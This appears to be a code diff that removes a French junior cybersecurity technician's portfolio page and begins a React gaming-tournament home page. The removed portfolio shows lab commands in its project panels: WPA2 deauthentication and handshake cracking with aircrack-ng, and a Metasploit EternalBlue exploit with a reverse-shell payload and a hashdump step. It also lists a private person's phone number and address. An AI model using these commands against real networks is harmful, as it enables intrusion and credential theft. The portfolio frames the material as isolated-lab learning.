-  transition: padding 0.7s cubic-bezier(0.175, 0.885, 0.32, 2.2), transform 0.5s;
-}
-.dock:hover { padding: 12px; }
-.dock a {
-  width: 48px; height: 48px;
-  border-radius: 14px;
-  background: linear-gradient(135deg, rgba(255,255,255,0.18), rgba(255,255,255,0.04));
-  border: 1px solid rgba(255,255,255,0.18);
-  display: flex; align-items: center; justify-content: center;
-  color: var(--ink);
-  font-size: 18px;
-  text-decoration: none;
-  transition: transform 0.5s cubic-bezier(0.175, 0.885, 0.32, 2.2),
-              background 0.4s, color 0.4s;
-  position: relative;
-}
-.dock a::after {
-  content: attr(data-label);
-  position: absolute;
-  bottom: calc(100% + 14px);
-  left: 50%; transform: translateX(-50%) translateY(8px);
-  background: rgba(0,0,0,0.85);
-  color: var(--ink);
-  font-family: var(--mono);
-  font-size: 10px;
-  letter-spacing: 0.06em;
-  padding: 6px 10px;
-  border-radius: 8px;
-  white-space: nowrap;
-  opacity: 0;
-  pointer-events: none;
-  transition: opacity 0.3s, transform 0.3s;
-  border: 1px solid rgba(255,255,255,0.12);
-}
-.dock a:hover::after { opacity: 1; transform: translateX(-50%) translateY(0); }
-.dock a:hover {
-  transform: translateY(-10px) scale(1.16);
-  background: linear-gradient(135deg, var(--accent), rgba(108,246,255,0.4));
-  color: #000;
-}
-.dock a.email:hover { background: linear-gradient(135deg, #ff5c8a, rgba(255,92,138,0.4)); color: #fff; }
-.dock a.phone:hover { background: linear-gradient(135deg, #28c840, rgba(40,200,64,0.4)); color: #fff; }
-
-@media (max-width: 600px) { .dock { padding: 8px; gap: 6px; } .dock a { width: 42px; height: 42px; font-size: 15px; border-radius: 12px; } }
-
-/* ============================================================
-   FOOTER
-============================================================ */
-footer {
-  text-align: center;
-  padding: 80px 20px 140px;
-  color: var(--ink-faint);
-  font-family: var(--mono);
-  font-size: 11px;
-  letter-spacing: 0.1em;
-}
-footer .signature {
-  font-family: var(--serif);
-  font-style: italic;
-  font-size: 16px;
-  color: var(--accent);
-  letter-spacing: 0;
-  margin: 10px 0;
-}
-
-/* ============================================================
-   REVEAL ON SCROLL
-============================================================ */
-.reveal { opacity: 0; transform: translateY(28px); transition: opacity 1s ease, transform 1.1s cubic-bezier(0.2,0.8,0.2,1); }
-.reveal.in { opacity: 1; transform: translateY(0); }
-.reveal.d1 { transition-delay: 0.08s; }
-.reveal.d2 { transition-delay: 0.18s; }
-.reveal.d3 { transition-delay: 0.28s; }
-.reveal.d4 { transition-delay: 0.38s; }
-
-@media (prefers-reduced-motion: reduce) {
-  *, *::before, *::after { animation-duration: 0.01ms !important; animation-iteration-count: 1 !important; transition-duration: 0.01ms !important; }
-}
-</style>
-</head>
-
-<body>
-
-<!-- WebGL Background -->
-<canvas id="bgCanvas"></canvas>
-<div class="bg-vignette"></div>
-<div class="bg-grain"></div>
-
-<!-- ============================================================
-     TOP NAV
-============================================================ -->
-<nav class="topnav glass">
-  <div class="brand">Elhoussayn<sup>⊹</sup></div>
-  <button class="nav-toggle" id="navToggle" aria-label="Menu"><i class="fa-solid fa-bars"></i></button>
-  <ul id="navMenu">
-    <li><a href="#about">À propos</a></li>
-    <li><a href="#skills">Stack</a></li>
-    <li><a href="#projects">Dossiers</a></li>
-    <li><a href="#contact">Contact</a></li>
-  </ul>
-  <a class="cta" href="mailto:e.oubenmoussa@gmail.com">Me recruter ↗</a>
-</nav>
-
-<main>
-
-<!-- ============================================================
-     HERO
-============================================================ -->
-<section class="hero">
-  <div class="hero-badge glass">
-    <span class="dot"></span>
-    AVAILABLE / JUNIOR CYBERSEC / 2026
-  </div>
-
-  <h1>
-    <span class="word">Elhoussayn</span><br>
-    <span class="word"><em>Oubenmoussa.</em></span>
-  </h1>
-
-  <p class="hero-tagline">
-    Technicien cybersécurité junior — 18 ans, basé à Béziers. Auto-formé sur Kali Linux, Wireshark et l'analyse offensive. À la recherche d'un poste, d'une alternance ou d'une formation TSSR.
-  </p>
-
-  <div class="hero-buttons">
-    <a class="glass-btn primary" href="#projects">
-      Voir mes projets <i class="fa-solid fa-arrow-right"></i>
-    </a>
-    <a class="glass-btn" href="#contact">
-      Me contacter <i class="fa-solid fa-arrow-up-right-from-square"></i>
-    </a>
-  </div>
-
-  <div class="hero-meta">
-    <span><i class="fa-solid fa-location-dot" style="color:var(--accent)"></i> BÉZIERS / 34</span>
-    <span><i class="fa-solid fa-circle-check" style="color:var(--accent)"></i> MISSION LOCALE</span>
-    <span><i class="fa-solid fa-shield-halved" style="color:var(--accent)"></i> ÉTHIQUE LAB-ONLY</span>
-  </div>
-</section>
-
-<!-- ============================================================
-     SCROLL-TRIGGERED 3D REVEAL
-============================================================ -->
-<section class="scroll-reveal" id="scrollReveal">
-  <div class="scroll-inner">
-    <div class="scroll-title" id="scrollTitle">
-      <span class="kicker">— BIENVENUE DANS</span>
-      <h2>Le <em>Lab</em>.</h2>
-    </div>
-
-    <div class="scroll-card" id="scrollCard">
-      <div class="scroll-card-inner">
-        <div class="term">
-          <div class="term-bar">
-            <div class="lights"><span></span><span></span><span></span></div>
-            <div class="title">~/cyber-lab/elhoussayn — bash</div>
-          </div>
-          <div class="term-body">
-            <span class="term-line"><span class="prompt">elhoussayn@kali</span><span class="out">:~$</span> <span class="cmd">whoami --verbose</span></span>
-            <span class="term-line"><span class="out">→ </span><span class="key">name</span><span class="out">  : </span><span class="val">"Elhoussayn Oubenmoussa"</span></span>
-            <span class="term-line"><span class="out">→ </span><span class="key">role</span><span class="out">  : </span><span class="val">"Junior Cybersecurity Technician"</span></span>
-            <span class="term-line"><span class="out">→ </span><span class="key">age</span><span class="out">   : </span><span class="val">18</span></span>
-            <span class="term-line"><span class="out">→ </span><span class="key">loc</span><span class="out">   : </span><span class="val">"Béziers, FR"</span></span>
-            <span class="term-line"><span class="out">→ </span><span class="key">stack</span><span class="out"> : [</span><span class="val">"kali", "wireshark", "metasploit", "scapy"</span><span class="out">]</span></span>
-            <br>
-            <span class="term-line"><span class="prompt">elhoussayn@kali</span><span class="out">:~$</span> <span class="cmd">cat ./mission.txt</span></span>
-            <span class="term-line"><span class="cmt"># comprendre la machine — pour mieux la défendre.</span></span>
-            <br>
-            <span class="term-line"><span class="prompt">elhoussayn@kali</span><span class="out">:~$</span> <span class="cmd">ls ./projects/</span></span>
-            <span class="term-line"><span class="out">  ./</span><span class="key">wifi-audit</span><span class="out">/    ./</span><span class="key">protocol-analysis</span><span class="out">/    ./</span><span class="key">isolated-lab</span><span class="out">/</span></span>
-            <span class="term-line"><span class="out">  ./</span><span class="key">veracrypt-fde</span><span class="out">/  ./</span><span class="key">security-tips</span><span class="out">/</span></span>
-            <br>
-            <span class="term-line"><span class="prompt">elhoussayn@kali</span><span class="out">:~$</span> <span class="cmd">./run.sh<span class="term-cursor"></span></span></span>
-          </div>
-          <div class="term-stats">
-            <span>● UPTIME 99.8%</span>
-            <span>● LAB ISOLÉ</span>
-            <span>● v2026.05</span>
-          </div>
-        </div>
-      </div>
-    </div>
-  </div>
-</section>
-
-<!-- ============================================================
-     ABOUT
-============================================================ -->
-<section class="section" id="about">
-  <div class="container">
-    <div class="section-head reveal">
-      <div class="left">
-        <span class="kicker">01 / Profil</span>
-        <h2>Auto-formé,<br>opérationnel, <em>passionné.</em></h2>
-        <p>Jeune marocain de 18 ans installé en France depuis 2023. La cybersécurité m'a happé dès les premiers mois — depuis, je construis mes compétences en autodidacte avec la rigueur d'un pentester.</p>
-      </div>
-    </div>
-
-    <div class="about-grid">
-      <aside class="about-portrait glass reveal">
-        <div class="frame">
-          <img src="image/nn.jpeg" alt="Elhoussayn Oubenmoussa" onerror="this.outerHTML='<span class=\'placeholder\'>EO</span>'">
-        </div>
-        <div class="meta">
-          <div><span class="k">Âge</span><span class="v">18 ans</span></div>
-          <div><span class="k">Origine</span><span class="v">Maroc</span></div>
-          <div><span class="k">Langues</span><span class="v">AR · FR (B2)</span></div>
-          <div><span class="k">Statut</span><span class="v">Disponible</span></div>
-        </div>
-      </aside>
-
-      <div class="about-text glass reveal d1">
-        <p class="lead">Je veux comprendre comment les choses cassent — <em>pour mieux les défendre.</em></p>
-
-        <p>Mes journées tournent autour de <strong>Kali Linux</strong>, <strong>Wireshark</strong>, <strong>Aircrack-ng</strong> et <strong>Metasploit</strong>. Tout en environnement de test isolé : aucune cible publique, aucune action illégale.</p>
-
-        <p>Aujourd'hui accompagné par la <strong>Mission Locale</strong> et inscrit à <strong>France Travail</strong>, je cherche un poste de Technicien Cybersécurité Junior, une formation TSSR, ou une alternance.</p>
-
-        <div class="timeline">
-          <div class="timeline-row">
-            <span class="yr">2022</span>
-            <div class="desc">Seconde Bac Pro Menuiserie<small>Maroc — réorientation après 2 mois</small></div>
-            <span class="tag">Parcours</span>
-          </div>
-          <div class="timeline-row">
-            <span class="yr">2023</span>
-            <div class="desc">Arrivée en France<small>Béziers — début de l'auto-formation cyber</small></div>
-            <span class="tag">Pivot</span>
-          </div>
-          <div class="timeline-row now">
-            <span class="yr">2026</span>
-            <div class="desc">Accompagnement professionnel<small>Mission Locale + France Travail</small></div>
-            <span class="tag">En cours</span>
-          </div>
-          <div class="timeline-row">
-            <span class="yr">↗</span>
-            <div class="desc">Technicien Cybersécurité Junior<small>Stage · alternance · formation TSSR</small></div>
-            <span class="tag">Objectif</span>
-          </div>
-        </div>
-      </div>
-    </div>
-  </div>
-</section>
-
-<!-- ============================================================
-     SKILLS
-============================================================ -->
-<section class="section" id="skills">
-  <div class="container">
-    <div class="section-head reveal">
-      <div class="left">
-        <span class="kicker">02 / Stack technique</span>
-        <h2>Quatre disciplines,<br>un seul <em>objectif.</em></h2>
-        <p>Comprendre la machine sous le capot — du paquet TCP au cipher AES, chaque couche compte.</p>
-      </div>
-    </div>
-
-    <div class="skills-grid">
-      <div class="skill-card glass reveal" data-w="70">
-        <span class="num">A</span>
-        <div class="icon-box"><i class="fa-solid fa-shield-halved"></i></div>
-        <h3>Cybersécurité<br>offensive</h3>
-        <p>Tests d'intrusion, OWASP, vecteurs modernes d'attaque.</p>
-        <div class="bar"></div>
-        <div class="stack"><span>Pentest</span><span>OSINT</span><span>OWASP</span></div>
-      </div>
-
-      <div class="skill-card glass reveal d1" data-w="75">
-        <span class="num">B</span>
-        <div class="icon-box"><i class="fa-solid fa-terminal"></i></div>
-        <h3>Kali Linux<br>& Bash</h3>
-        <p>Environnement de test maîtrisé, scripts, exploitation.</p>
-        <div class="bar"></div>
-        <div class="stack"><span>bash</span><span>nmap</span><span>metasploit</span><span>hydra</span></div>
-      </div>
-
-      <div class="skill-card glass reveal d2" data-w="65">
-        <span class="num">C</span>
-        <div class="icon-box"><i class="fa-solid fa-network-wired"></i></div>
-        <h3>Réseaux<br>& protocoles</h3>
-        <p>TCP/IP, DNS, HTTP/HTTPS, SSH — capture et analyse.</p>
-        <div class="bar"></div>
-        <div class="stack"><span>wireshark</span><span>tcpdump</span><span>scapy</span></div>
-      </div>
-
-      <div class="skill-card glass reveal d3" data-w="60">
-        <span class="num">D</span>
-        <div class="icon-box"><i class="fa-solid fa-wifi"></i></div>
-        <h3>Sécurité<br>wireless</h3>
-        <p>Audit WiFi, mode monitor, capture WPA, durcissement.</p>
-        <div class="bar"></div>
-        <div class="stack"><span>aircrack-ng</span><span>airmon</span><span>WPA2</span></div>
-      </div>
-    </div>
-  </div>
-</section>
-
-<!-- ============================================================
-     PROJECTS
-============================================================ -->
-<section class="section" id="projects">
-  <div class="container">
-    <div class="section-head reveal">
-      <div class="left">
-        <span class="kicker">03 / Dossiers</span>
-        <h2>Cinq cas pratiques,<br>tous en lab <em>isolé.</em></h2>
-        <p>Chaque dossier documente une attaque, sa contre-mesure, et les outils utilisés. Strictement légal et éducatif.</p>
-      </div>
-    </div>
-
-    <div class="projects-grid">
-
-      <article class="project-card glass reveal" data-modal="m-wifi">
-        <div class="project-head">
-          <span class="project-num">01</span>
-          <i class="fa-solid fa-arrow-right project-arrow"></i>
-        </div>
-        <h3>Sécurité des<br>réseaux sans-fil</h3>
-        <p>Audit complet WPA2, capture de handshake, durcissement.</p>
-        <div class="pills">
-          <span class="pill">Aircrack-ng</span>
-          <span class="pill">WPA2</span>
-          <span class="pill">3 sem.</span>
-          <span class="status">Documenté</span>
-        </div>
-      </article>
-
-      <article class="project-card glass reveal d1" data-modal="m-protocol">
-        <div class="project-head">
-          <span class="project-num">02</span>
-          <i class="fa-solid fa-arrow-right project-arrow"></i>
-        </div>
-        <h3>Analyse de<br>protocoles</h3>
-        <p>HTTP, SSH, DNS — décortiquer le trafic pour détecter les failles.</p>
-        <div class="pills">
-          <span class="pill">Wireshark</span>
-          <span class="pill">Scapy</span>
-          <span class="pill">4 sem.</span>
-          <span class="status">Documenté</span>
-        </div>
-      </article>
-
-      <article class="project-card glass reveal d2" data-modal="m-lab">
-        <div class="project-head">
-          <span class="project-num">03</span>
-          <i class="fa-solid fa-arrow-right project-arrow"></i>
-        </div>
-        <h3>Lab de test<br>isolé</h3>
-        <p>Infrastructure virtualisée pour la pratique offensive contrôlée.</p>
-        <div class="pills">
-          <span class="pill">VirtualBox</span>
-          <span class="pill">Metasploit</span>
-          <span class="pill">Continu</span>
-          <span class="status">Actif</span>
-        </div>
-      </article>
-
-      <article class="project-card glass reveal d3" data-modal="m-vera">
-        <div class="project-head">
-          <span class="project-num">04</span>
-          <i class="fa-solid fa-arrow-right project-arrow"></i>
-        </div>
-        <h3>Chiffrement<br>total VeraCrypt</h3>
-        <p>Full disk encryption AES-256 / SHA-512 sur PC personnel.</p>
-        <div class="pills">
-          <span class="pill">AES-256</span>
-          <span class="pill">SHA-512</span>
-          <span class="pill">1 sem.</span>
-          <span class="status">Déployé</span>
-        </div>
-      </article>
-
-      <article class="project-card glass reveal d4" data-modal="m-tips" style="grid-column: 1 / -1;">
-        <div class="project-head">
-          <span class="project-num">05</span>
-          <i class="fa-solid fa-arrow-right project-arrow"></i>
-        </div>
-        <h3>Guide hygiène sécurité — <em style="color:var(--accent);font-style:italic;font-family:var(--serif)">débutants</em></h3>
-        <p>Phishing, WiFi public, 2FA, gestion des mots de passe — les règles minimum pour ne pas devenir une cible facile.</p>
-        <div class="pills">
-          <span class="pill">Phishing</span>
-          <span class="pill">2FA</span>
-          <span class="pill">WiFi</span>
-          <span class="pill">Social Engineering</span>
-          <span class="status">Public</span>
-        </div>
-      </article>
-
-    </div>
-  </div>
-</section>
-
-<!-- ============================================================
-     CONTACT
-============================================================ -->
-<section class="section" id="contact">
-  <div class="container">
-    <div class="contact-card glass-strong reveal">
-      <div>
-        <h2 class="contact-headline">
-          Disponible<br>
-          <em>maintenant.</em>
-        </h2>
-        <p class="sub">Pour un poste de Technicien Cybersécurité Junior, une formation TSSR, un stage ou une alternance — j'écoute toutes les opportunités sérieuses.</p>
-      </div>
-
-      <div class="contact-list">
-        <a class="contact-row" href="mailto:e.oubenmoussa@gmail.com">
-          <span class="icon-box"><i class="fa-solid fa-envelope"></i></span>
-          <span class="info">
-            <span class="k">Email</span>
-            <span class="v">e.oubenmoussa@gmail.com</span>
-          </span>
-          <i class="fa-solid fa-arrow-right arrow"></i>
-        </a>
-        <a class="contact-row" href="tel:+33659255558">
-          <span class="icon-box"><i class="fa-solid fa-phone"></i></span>
-          <span class="info">
-            <span class="k">Téléphone</span>
-            <span class="v">+33 6 59 25 55 58</span>
-          </span>
-          <i class="fa-solid fa-arrow-right arrow"></i>
-        </a>
-        <a class="contact-row" href="https://maps.google.com/?q=7+Rue+des+Tanneurs+Béziers" target="_blank" rel="noopener">
-          <span class="icon-box"><i class="fa-solid fa-location-dot"></i></span>
-          <span class="info">
-            <span class="k">Adresse</span>
-            <span class="v">7 Rue des Tanneurs, Béziers</span>
-          </span>
-          <i class="fa-solid fa-arrow-right arrow"></i>
-        </a>
-        <a class="contact-row" href="https://www.instagram.com/thor_finne/" target="_blank" rel="noopener">
-          <span class="icon-box"><i class="fa-brands fa-instagram"></i></span>
-          <span class="info">
-            <span class="k">Instagram</span>
-            <span class="v">@thor_finne</span>
-          </span>
-          <i class="fa-solid fa-arrow-right arrow"></i>
-        </a>
-      </div>
-    </div>
-  </div>
-</section>
-
-<footer>
-  <div>© 2026 / OUBENMOUSSA.E / BÉZIERS</div>
-  <div class="signature">Crafted with discipline ⊹</div>
-  <div>v.2026.05</div>
-</footer>
-
-</main>
-
-<!-- ============================================================
-     DOCK
-============================================================ -->
-<div class="dock">
-  <a href="#about" data-label="À propos"><i class="fa-solid fa-user"></i></a>
-  <a href="#skills" data-label="Stack"><i class="fa-solid fa-shield-halved"></i></a>
-  <a href="#projects" data-label="Dossiers"><i class="fa-solid fa-folder-open"></i></a>
-  <a class="email" href="mailto:e.oubenmoussa@gmail.com" data-label="Email"><i class="fa-solid fa-envelope"></i></a>
-  <a class="phone" href="tel:+33659255558" data-label="Appeler"><i class="fa-solid fa-phone"></i></a>
-  <a href="https://www.instagram.com/thor_finne/" target="_blank" rel="noopener" data-label="Instagram"><i class="fa-brands fa-instagram"></i></a>
-</div>
-
-<!-- ============================================================
-     PROJECT MODALS
-============================================================ -->
-<div class="modal-backdrop" id="modalBackdrop"></div>
-
-<div class="modal" id="m-wifi">
-  <div class="modal-head">
-    <span class="label">DOSSIER 01 / WIFI-AUDIT</span>
-    <button class="modal-close" data-close><i class="fa-solid fa-xmark"></i></button>
-  </div>
-  <div class="modal-body">
-    <h2>Sécurité des réseaux <em>sans-fil</em></h2>
-    <p class="sub">Audit complet WPA2 — capture de handshake, analyse, durcissement.</p>
-
-    <div class="modal-section">
-      <h4>Contexte</h4>
-      <p>Étude approfondie des mécanismes d'authentification WPA/WPA2 sur un point d'accès dédié au lab. Comprendre la chaîne d'attaque pour mieux la défendre.</p>
-    </div>
-
-    <div class="modal-section">
-      <h4>Stack utilisée</h4>
-      <div class="modal-stack">
-        <span class="pill">Kali Linux</span>
-        <span class="pill">aircrack-ng</span>
-        <span class="pill">airodump-ng</span>
-        <span class="pill">aireplay-ng</span>
-        <span class="pill">Wireshark</span>
-      </div>
-    </div>
-
-    <div class="modal-section">
-      <h4>Procédure type</h4>
-      <pre class="code-block"><span class="cmt"># Activer le mode monitor</span>
-<span class="cmd">sudo airmon-ng</span> start wlan0
-
-<span class="cmt"># Scanner les réseaux à proximité</span>
-<span class="cmd">sudo airodump-ng</span> wlan0mon
-
-<span class="cmt"># Cibler un AP — capturer le handshake</span>
-<span class="cmd">sudo airodump-ng</span> -c <span class="arg">6</span> --bssid &lt;MAC&gt; -w cap wlan0mon
-
-<span class="cmt"># Forcer une réauth pour accélérer la capture</span>
-<span class="cmd">sudo aireplay-ng</span> --deauth <span class="arg">5</span> -a &lt;MAC&gt; wlan0mon
-
-<span class="cmt"># Tenter la cassure du PSK</span>
-<span class="cmd">aircrack-ng</span> -w rockyou.txt -b &lt;MAC&gt; cap*.cap</pre>
-    </div>
-
-    <div class="modal-section">
-      <h4>Mesures de défense</h4>
-      <ul>
-        <li>Migrer vers WPA3 ou WPA2-AES exclusivement</li>
-        <li>Mot de passe ≥ 14 caractères avec entropie élevée</li>
-        <li>Désactiver <code>WPS</code> (vulnérable par design)</li>
-        <li>Changer les credentials admin par défaut du routeur</li>
-        <li>Activer la journalisation des connexions</li>
-      </ul>
-    </div>
-
-    <div class="warn-box">
-      <strong>⚠ Note légale.</strong> Toutes les manipulations ont été réalisées sur un réseau personnel dédié. L'audit WiFi sans autorisation est un délit.
-    </div>
-  </div>
-</div>
-
-<div class="modal" id="m-protocol">
-  <div class="modal-head">
-    <span class="label">DOSSIER 02 / PROTOCOL-ANALYSIS</span>
-    <button class="modal-close" data-close><i class="fa-solid fa-xmark"></i></button>
-  </div>
-  <div class="modal-body">
-    <h2>Analyse de <em>protocoles</em></h2>
-    <p class="sub">Décortiquer le trafic pour identifier les vulnérabilités structurelles.</p>
-
-    <div class="modal-section">
-      <h4>Protocoles étudiés</h4>
-      <div class="modal-stack">
-        <span class="pill">HTTP/HTTPS</span>
-        <span class="pill">TCP/UDP</span>
-        <span class="pill">SSH</span>
-        <span class="pill">DNS</span>
-        <span class="pill">FTP</span>
-        <span class="pill">SMTP</span>
-      </div>
-    </div>
-
-    <div class="modal-section">
-      <h4>Outillage</h4>
-      <ul>
-        <li><code>wireshark</code> — capture et filtrage temps réel</li>
-        <li><code>tcpdump</code> — analyse en ligne de commande</li>
-        <li><code>scapy</code> — forge de paquets personnalisés en Python</li>
-      </ul>
-    </div>
-
-    <div class="modal-section">
-      <h4>Sniffer HTTP — Python / Scapy</h4>
-      <pre class="code-block"><span class="cmd">from</span> scapy.all <span class="cmd">import</span> *
-
-<span class="cmd">def</span> http_sniffer(pkt):
-    <span class="cmd">if</span> pkt.haslayer(TCP) <span class="cmd">and</span> pkt.haslayer(Raw):
-        load = pkt[Raw].load
-        <span class="cmd">if</span> b<span class="arg">"GET"</span> <span class="cmd">in</span> load <span class="cmd">or</span> b<span class="arg">"POST"</span> <span class="cmd">in</span> load:
-            print(f<span class="arg">"HTTP {load[:80]}"</span>)
-
-sniff(filter=<span class="arg">"tcp port 80"</span>, prn=http_sniffer)</pre>
-    </div>
-
-    <div class="modal-section">
-      <h4>Vulnérabilités courantes</h4>
-      <ul>
-        <li>Mixed content (HTTP encapsulé dans HTTPS)</li>
-        <li>Cipher suites obsolètes (TLS &lt; 1.2)</li>
-        <li>Information leakage dans les headers</li>
-        <li>SSH avec authentification mot de passe seule, root activé</li>
-        <li>DNS sans DoH/DoT — interception facilitée</li>
-      </ul>
-    </div>
-  </div>
-</div>
-
-<div class="modal" id="m-lab">
-  <div class="modal-head">
-    <span class="label">DOSSIER 03 / LAB-INFRA</span>
-    <button class="modal-close" data-close><i class="fa-solid fa-xmark"></i></button>
-  </div>
-  <div class="modal-body">
-    <h2>Lab de <em>test isolé</em></h2>
-    <p class="sub">Infrastructure virtualisée dédiée à la pratique offensive contrôlée.</p>
-
-    <div class="modal-section">
-      <h4>Configuration</h4>
-      <ul>
-        <li>VirtualBox + machine attaquante Kali Linux</li>
-        <li>Réseau interne isolé (NAT privé) — aucune sortie publique</li>
-        <li>Cibles : Windows 10/11 + Metasploitable 2 (Linux vulnérable)</li>
-        <li>Snapshots systématiques avant chaque test</li>
-        <li>Documentation des exploits et journal d'activité</li>
-      </ul>
-    </div>
-
-    <div class="modal-section">
-      <h4>Stack offensive</h4>
-      <div class="modal-stack">
-        <span class="pill">Metasploit</span>
-        <span class="pill">Nmap</span>
-        <span class="pill">Hydra</span>
-        <span class="pill">SQLmap</span>
-        <span class="pill">Burp Suite</span>
-        <span class="pill">John the Ripper</span>
-      </div>
-    </div>
-
-    <div class="modal-section">
-      <h4>Exemple — exploitation EternalBlue (lab uniquement)</h4>
-      <pre class="code-block"><span class="cmd">msfconsole</span>
-<span class="cmd">use</span> exploit/windows/smb/ms17_010_eternalblue
-<span class="cmd">set</span> RHOSTS <span class="arg">192.168.56.101</span>
-<span class="cmd">set</span> PAYLOAD windows/x64/meterpreter/reverse_tcp
-<span class="cmd">set</span> LHOST <span class="arg">192.168.56.50</span>
-<span class="cmd">exploit</span>
-
-<span class="cmt"># Post-exploitation</span>
-<span class="cmd">sysinfo</span>
-<span class="cmd">getuid</span>
-<span class="cmd">hashdump</span></pre>
-    </div>
-
-    <div class="warn-box">
-      <strong>⚠ Cadre éthique.</strong> Le lab est strictement isolé. Aucune cible publique, aucun système tiers.
-    </div>
-  </div>
-</div>
-
-<div class="modal" id="m-vera">
-  <div class="modal-head">
-    <span class="label">DOSSIER 04 / FULL-DISK-ENCRYPTION</span>
-    <button class="modal-close" data-close><i class="fa-solid fa-xmark"></i></button>
-  </div>
-  <div class="modal-body">
-    <h2>Chiffrement total <em>VeraCrypt</em></h2>
-    <p class="sub">Chiffrement complet du disque système — protection des données au repos.</p>
-
-    <div class="modal-section">
-      <h4>Configuration retenue</h4>
-      <ul>
-        <li>Algorithme : <code>AES-256</code> (matériel-accéléré)</li>
-        <li>Hash : <code>SHA-512</code></li>
-        <li>Chiffrement système complet (boot inclus)</li>
-        <li>Mot de passe ≥ 20 caractères avec entropie haute</li>
-        <li>USB de récupération hors site</li>
-      </ul>
-    </div>
-
-    <div class="modal-section">
-      <h4>Procédure de déploiement</h4>
-      <ul>
-        <li>Sauvegarde intégrale + vérification d'intégrité (SHA-256)</li>
-        <li>Téléchargement VeraCrypt depuis la source officielle</li>
-        <li>Vérification du checksum du binaire</li>
-        <li>Création du Rescue Disk USB</li>
-        <li>Lancement du chiffrement (4–8 h selon volume)</li>
-        <li>Tests de boot et d'intégrité post-chiffrement</li>
-      </ul>
-    </div>
-
-    <div class="modal-section">
-      <h4>Bénéfices opérationnels</h4>
-      <ul>
-        <li>Protection en cas de vol physique</li>
-        <li>Conformité RGPD pour données sensibles</li>
-        <li>Impact performances négligeable (1–5 % avec AES-NI)</li>
-        <li>Transparent pour l'utilisateur après authentification</li>
-      </ul>
-    </div>
-
-    <div class="warn-box">
-      <strong>⚠ Point critique.</strong> La perte du mot de passe maître = perte définitive des données. Sauvegarde et procédure de récupération obligatoires.
-    </div>
-  </div>
-</div>
-
-<div class="modal" id="m-tips">
-  <div class="modal-head">
-    <span class="label">DOSSIER 05 / SECURITY-HYGIENE</span>
-    <button class="modal-close" data-close><i class="fa-solid fa-xmark"></i></button>
-  </div>
-  <div class="modal-body">
-    <h2>Hygiène sécurité <em>— débutants</em></h2>
-    <p class="sub">Les règles minimum pour ne pas devenir une cible facile.</p>
-
-    <div class="modal-section">
-      <h4>Phishing — savoir détecter</h4>
-      <ul>
-        <li>Ne jamais cliquer sur un lien reçu par SMS/email non sollicité</li>
-        <li>Vérifier l'URL caractère par caractère — <code>amaz0n.com</code> ≠ <code>amazon.com</code></li>
-        <li>Toujours taper l'adresse manuellement pour les sites sensibles</li>
-        <li>Aucun service légitime ne demande votre mot de passe par email</li>
-      </ul>
-    </div>
-
-    <div class="modal-section">
-      <h4>WiFi — protection minimale</h4>
-      <ul>
-        <li>WPA2-AES ou WPA3 — jamais WEP</li>
-        <li>Mot de passe long, désactiver WPS</li>
-        <li>Sur WiFi public : VPN obligatoire ou rien d'important</li>
-      </ul>
-    </div>
-
-    <div class="modal-section">
-      <h4>Règles d'or</h4>
-      <ul>
-        <li><strong style="color:var(--ink)">2FA partout</strong> — gestionnaire d'authentification, jamais SMS</li>
-        <li>Mots de passe <strong style="color:var(--ink)">uniques</strong> par site (gestionnaire de mots de passe)</li>
-        <li>Mises à jour système et applicatives — sans exception</li>
-        <li>Ne jamais brancher un USB inconnu trouvé dans la nature</li>
-        <li>Méfiance face à toute demande "urgente" jouant sur la peur</li>
-      </ul>
-    </div>
-
-    <div class="modal-section">
-      <h4>Pour aller plus loin (gratuit)</h4>
-      <ul>
-        <li>TryHackMe — rooms gratuites pour débuter</li>
-        <li>OverTheWire — wargame Bandit pour la console Linux</li>
-        <li>Documentation officielle Kali Linux</li>
-        <li>Chaînes : NetworkChuck, John Hammond, LiveOverflow</li>
-      </ul>
-    </div>
-  </div>
-</div>
-
-<!-- ============================================================
-     SCRIPTS
-============================================================ -->
-<script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
-<script>
-/* ============================================================
-   WEBGL SHADER BACKGROUND
-   (adapted from 21st.dev WebGLShader component)
-============================================================ */
-(function() {
-  const canvas = document.getElementById('bgCanvas');
-  if (!canvas || typeof THREE === 'undefined') return;
-
-  const scene = new THREE.Scene();
-  const camera = new THREE.OrthographicCamera(-1, 1, 1, -1, 0, -1);
-  const renderer = new THREE.WebGLRenderer({ canvas, antialias: false });
-  renderer.setPixelRatio(Math.min(window.devicePixelRatio, 2));
-  renderer.setClearColor(new THREE.Color(0x000000));
-
-  const uniforms = {
-    resolution: { value: [window.innerWidth, window.innerHeight] },
-    time: { value: 0.0 },
-    xScale: { value: 1.0 },
-    yScale: { value: 0.5 },
-    distortion: { value: 0.05 },
+// pages/Home.jsx
+import React, { useState, useEffect } from 'react';
+import { Link } from 'react-router-dom';
+import { motion, useScroll, useTransform } from 'framer-motion';
+import { supabase } from '../lib/supabase';
+import { useAuth } from '../contexts/AuthContext';
+import GlassCard from '../components/GlassCard';
+import TournamentCard from '../components/TournamentCard';
+import { theme } from '../styles/theme';
+
+const Home = () => {
+  const { scrollYProgress } = useScroll();
+  const { user, profile } = useAuth();
+  const [featuredTournaments, setFeaturedTournaments] = useState([]);
+  const [leaderboard, setLeaderboard] = useState([]);
+  const [loading, setLoading] = useState(true);
+
+  const heroY = useTransform(scrollYProgress, [0, 1], [0, 200]);
+  const heroOpacity = useTransform(scrollYProgress, [0, 0.5], [1, 0]);
+
+  useEffect(() => {
+    fetchData();
+  }, []);
+
+  const fetchData = async () => {
+    setLoading(true);
+    try {
+      // Fetch featured tournaments
+      const { data: tournaments } = await supabase
+        .from('tournaments')
+        .select('*')
+        .eq('featured', true)
+        .limit(3);
+
+      // Fetch leaderboard
+      const { data: leaderboardData } = await supabase
+        .from('profiles')
+        .select('id, full_name, free_fire_id, coins, rank')
+        .order('coins', { ascending: false })
+        .limit(10);
+
+      setFeaturedTournaments(tournaments || []);
+      setLeaderboard(leaderboardData || []);
+    } catch (error) {
+      console.error('Error fetching home data:', error);
+    } finally {
+      setLoading(false);
+    }
   };
 
-  const vertexShader = `
-    attribute vec3 position;
-    void main() { gl_Position = vec4(position, 1.0); }
-  `;
+  return (
+    <div>
+      {/* ==================== CINEMATIC HERO ==================== */}
+      <section style={{
+        minHeight: '100vh',
+        display: 'flex',
+        alignItems: 'center',
+        position: 'relative',
+        overflow: 'hidden',
+      }}>
+        <motion.div
+          style={{
+            position: 'absolute',
+            inset: 0,
+            y: heroY,
+            opacity: heroOpacity,
+          }}
+        >
+          <div style={{
+            position: 'absolute',
+            inset: 0,
